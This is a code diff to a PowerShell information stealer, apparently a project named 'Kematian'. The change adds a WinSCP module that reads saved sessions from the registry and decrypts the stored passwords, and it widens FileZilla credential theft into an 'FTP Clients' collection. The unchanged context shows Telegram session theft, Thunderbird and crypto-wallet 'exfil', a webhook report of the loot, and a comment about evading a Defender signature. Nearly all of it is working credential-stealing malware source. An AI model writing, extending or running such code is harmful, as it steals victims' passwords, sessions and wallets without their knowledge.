@@ -144,14 +144,15 @@ function Backup-Data {
     $folder_email = "$folderformat\Email Clients"
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
-    $filezilla_bkp = "$folderformat\FileZilla"
+    $ftp_clients = "$folderformat\FTP Clients"
 
-    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
     foreach ($folder in $folders) {if (Test-Path $folder) {Remove-Item $folder -Recurse -Force }}
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
     }
-
+    Write-Host "[!] Backup Directories Created" -ForegroundColor Green
+	
     #bulk data (added build ID with banner)
     function Get-Network {
         $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
@@ -309,6 +310,7 @@ function Backup-Data {
     # All Messaging Sessions
     
     # Telegram 
+	Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
     function telegramstealer {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
@@ -597,7 +599,8 @@ function Backup-Data {
     function filezilla_stealer {
         $FileZillafolder = "$env:appdata\FileZilla"
         if (!(Test-Path $FileZillafolder)) { return }
-        $filezilla_hosts = "$filezilla_bkp"
+        $filezilla_hosts = "$ftp_clients\FileZilla"
+		New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
         $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
         $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
         function ParseServerInfo {
@@ -626,8 +629,89 @@ function Backup-Data {
             }
         }
         $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
+		 Write-Host "[!] Filezilla Session information saved !" -ForegroundColor Green
     }
     filezilla_stealer
+	
+	#  WinSCP  
+	function Get-WinSCPSessions {
+    $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+	$winscp_session = "$ftp_clients\WinSCP"
+	New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
+	$outputPath = "$winscp_session\WinSCP-sessions.txt"
+    $output = "WinSCP Sessions`n`n"
+    $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
+    function Get-RegistryValue {
+        param ([string]$subKey,[string]$valueName)
+        $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
+        return $result.sValue
+    }
+    function Get-RegistrySubKeys {
+        param ([string]$subKey)
+        $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
+        return $result.sNames
+    }
+    $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
+    if ($null -eq $sessionKeys) {
+        Write-Error "[!] Failed to enumerate registry keys under $registryPath"
+        return
+    }
+	function DecryptNextCharacterWinSCP {
+    param ([string]$remainingPass)
+    $Magic = 163
+    $flagAndPass = "" | Select-Object -Property flag, remainingPass
+    $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
+    $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
+    $Added = $firstval + $secondval
+    $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
+    $flagAndPass.flag = $decryptedResult
+    $flagAndPass.remainingPass = $remainingPass.Substring(2)
+    return $flagAndPass
+    }
+	function DecryptWinSCPPassword {
+    param ([string]$SessionHostname,[string]$SessionUsername,[string]$Password)
+    $CheckFlag = 255
+    $Magic = 163
+    $key = $SessionHostname + $SessionUsername
+    $values = DecryptNextCharacterWinSCP -remainingPass $Password
+    $storedFlag = $values.flag
+    if ($values.flag -eq $CheckFlag) {
+        $values.remainingPass = $values.remainingPass.Substring(2)
+        $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+    }
+    $len = $values.flag
+    $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+    $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
+    $finalOutput = ""
+    for ($i = 0; $i -lt $len; $i++) {
+        $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+        $finalOutput += [char]$values.flag
+    }
+    if ($storedFlag -eq $CheckFlag) {
+        return $finalOutput.Substring($key.Length)
+    }
+    return $finalOutput
+    }
+   foreach ($sessionKey in $sessionKeys) {
+        $sessionName = $sessionKey
+        $sessionPath = "$registryPath\$sessionName"
+        $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
+        $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
+        $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
+        if ($encryptedPassword) {
+            $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
+        } else {
+            $password = "No password saved"
+        }
+        $output += "Session  : $sessionName`n"
+        $output += "Hostname : $hostname`n"
+        $output += "Username : $username`n"
+        $output += "Password : $password`n`n"
+    }
+    $output | Out-File -FilePath $outputPath
+    Write-Host "[!] WinSCP Session information saved !" -ForegroundColor Green
+   }
+   Get-WinSCPSessions
 
     # Thunderbird Exfil
     if (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
@@ -695,6 +779,7 @@ function Backup-Data {
         }
     }
     Invoke-Crypto_Wallets
+	Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
@@ -955,9 +1040,10 @@ function Backup-Data {
             'False'
         }
 
-        $filezilla_info = if (Test-Path $filezilla_bkp) {
-            if (Test-Path "$filezilla_bkp\Hosts.txt") {
-                'True'
+        $ftp_accounts_info = if (Test-Path $ftp_clients) {
+            $ftp_accounts_content = Get-ChildItem -Path $ftp_clients -Directory | ForEach-Object { $_.Name -replace '\..+$' }
+            if ($ftp_accounts_content) {
+                $ftp_accounts_content -join ' | '
             }
             else {
                 'False'
@@ -968,7 +1054,7 @@ function Backup-Data {
         }
 
         # Add data to webhook
-        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFileZilla: $filezilla_info"
+        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFTP Clients: $ftp_accounts_info"
         return $webhookData
     }     
     $kematainwebhook = kematianinfo
